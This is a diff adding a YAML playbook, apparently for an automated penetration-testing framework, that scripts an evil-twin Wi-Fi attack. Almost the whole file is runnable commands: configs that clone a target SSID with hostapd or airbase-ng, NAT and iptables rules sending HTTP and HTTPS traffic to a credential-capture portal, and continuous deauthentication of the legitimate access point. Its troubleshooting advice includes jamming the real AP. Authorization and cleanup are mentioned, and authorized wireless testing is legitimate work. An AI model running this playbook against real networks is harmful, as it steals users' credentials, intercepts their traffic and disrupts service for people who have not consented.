@@ -1,0 +1,229 @@
+id: evil_twin_attack
+name: Evil Twin Attack
+category: Wireless Access
+priority: critical
+description: Create a fake access point mimicking legitimate network to capture credentials.
+detailed_description: |
+  Set up a rogue access point that mimics a legitimate wireless network to capture user credentials,
+  perform man-in-the-middle attacks, or gain network access through social engineering.
+
+required_conditions:
+  - wireless_capability
+  - target_ssid_known
+
+optional_conditions:
+  - captive_portal_present
+  - open_network
+  - clients_auto_connect
+
+tools:
+  - name: hostapd
+    description: Access point daemon
+    platform: linux
+  - name: dnsmasq
+    description: DHCP and DNS server
+    platform: linux
+  - name: airbase-ng
+    description: Access point creation tool
+    platform: linux
+
+phases:
+  - name: reconnaissance
+    steps:
+      - id: identify_target
+        action: Identify target network details
+        command: sudo airodump-ng {wireless_interface}mon
+        output_variables:
+          - target_ssid
+          - target_channel
+          - target_bssid
+          - encryption_type
+
+      - id: check_signal_strength
+        action: Check legitimate AP signal strength
+        command: |
+          iwlist {wireless_interface} scanning | grep -A 5 "{target_ssid}"
+
+  - name: setup
+    steps:
+      - id: create_hostapd_config
+        action: Create hostapd configuration
+        command: |
+          cat > /tmp/hostapd.conf << EOF
+          interface={wireless_interface}
+          driver=nl80211
+          ssid={target_ssid}
+          hw_mode=g
+          channel={channel_number}
+          wmm_enabled=0
+          macaddr_acl=0
+          auth_algs=1
+          ignore_broadcast_ssid=0
+          EOF
+
+      - id: add_wpa_config
+        action: Add WPA configuration if needed
+        command: |
+          cat >> /tmp/hostapd.conf << EOF
+          wpa=2
+          wpa_passphrase={temporary_password}
+          wpa_key_mgmt=WPA-PSK
+          wpa_pairwise=TKIP
+          rsn_pairwise=CCMP
+          EOF
+        conditional: wpa_network
+
+      - id: create_dnsmasq_config
+        action: Create DHCP/DNS configuration
+        command: |
+          cat > /tmp/dnsmasq.conf << EOF
+          interface=at0
+          dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
+          dhcp-option=3,10.0.0.1
+          dhcp-option=6,10.0.0.1
+          server=8.8.8.8
+          log-queries
+          log-dhcp
+          EOF
+
+  - name: execution
+    steps:
+      - id: start_fake_ap
+        action: Start fake access point
+        command: sudo hostapd /tmp/hostapd.conf
+        alternatives:
+          - shell: airbase
+            command: sudo airbase-ng -e "{target_ssid}" -c {channel_number} {wireless_interface}mon
+
+      - id: configure_interface
+        action: Configure network interface
+        command: |
+          sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
+          sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+
+      - id: start_dhcp_dns
+        action: Start DHCP and DNS services
+        command: sudo dnsmasq -C /tmp/dnsmasq.conf --no-daemon
+
+      - id: enable_forwarding
+        action: Enable IP forwarding
+        command: |
+          sudo sysctl net.ipv4.ip_forward=1
+          sudo iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE
+          sudo iptables -A FORWARD -i at0 -o {internet_interface} -j ACCEPT
+
+  - name: exploitation
+    steps:
+      - id: capture_credentials
+        action: Capture credentials via captive portal
+        command: |
+          # Start web server with credential capture page
+          python3 -m http.server 80 --directory /tmp/captive_portal
+
+      - id: redirect_http
+        action: Redirect HTTP traffic to captive portal
+        command: |
+          sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
+          sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80
+
+      - id: deauth_legitimate
+        action: Deauth clients from legitimate AP
+        command: sudo aireplay-ng -0 0 -a {legitimate_bssid} {wireless_interface}mon
+        caution: Continuous deauth - highly disruptive
+
+triggers:
+  on_complete:
+    - methodology: credential_harvesting
+      condition: credentials_captured
+    - methodology: man_in_the_middle
+      condition: clients_connected
+
+findings:
+  - id: no_certificate_pinning
+    title: No Certificate Pinning
+    severity: high
+    description: Users accept invalid certificates
+
+  - id: users_ignore_warnings
+    title: Users Ignore Security Warnings
+    severity: high
+    description: Social engineering successful against users
+
+  - id: no_pmf_protection
+    title: No 802.11w (PMF) Protection
+    severity: medium
+    description: Management frames not protected
+
+  - id: weak_security_awareness
+    title: Weak Security Awareness
+    severity: medium
+    description: Users connect to rogue networks
+
+issues:
+  - symptom: Clients detect fake AP
+    severity: high
+    causes:
+      - Signal strength difference
+      - Certificate validation
+      - SSID already saved
+    resolutions:
+      - Match signal strength
+      - Use similar certificate
+      - Jam legitimate AP
+
+  - symptom: No clients connecting
+    severity: medium
+    causes:
+      - Wrong encryption type
+      - Channel mismatch
+      - Signal too weak
+    resolutions:
+      - Match exact configuration
+      - Use same channel
+      - Increase transmit power
+
+  - symptom: Legal/detection concerns
+    severity: critical
+    causes:
+      - Illegal without authorization
+      - WIDS detection
+      - Highly visible attack
+    resolutions:
+      - Ensure proper authorization
+      - Limit attack duration
+      - Use during authorized window
+
+cleanup:
+  - priority: critical
+    action: Stop deauthentication
+    command: sudo killall aireplay-ng
+
+  - priority: high
+    action: Stop fake AP
+    command: |
+      sudo killall hostapd airbase-ng dnsmasq
+      sudo service network-manager restart
+
+  - priority: high
+    action: Remove iptables rules
+    command: |
+      sudo iptables -t nat -F
+      sudo iptables -F
+      sudo sysctl net.ipv4.ip_forward=0
+
+  - priority: medium
+    action: Remove configuration files
+    command: rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf
+
+outcome_analysis:
+  success_indicators:
+    - Clients connect to fake AP
+    - Credentials captured
+    - Traffic intercepted
+    - Network access gained
+
+  failure_indicators:
+    - No clients connect
+    - Detection by security team
+    - Certificate validation prevents attack
+    - PMF protection active
